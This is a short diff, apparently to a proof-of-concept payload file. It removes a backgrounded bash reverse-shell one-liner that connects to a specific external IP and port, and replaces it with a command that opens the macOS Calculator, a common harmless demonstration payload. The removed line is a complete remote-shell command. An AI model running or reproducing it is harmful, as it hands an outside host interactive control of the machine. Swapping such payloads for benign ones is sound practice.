@@ -1,1 +1,1 @@
-nohup bash -i >& /dev/tcp/95.217.240.215/1337 0>&1 &
+/System/Applications/Calculator.app/Contents/MacOS/Calculator
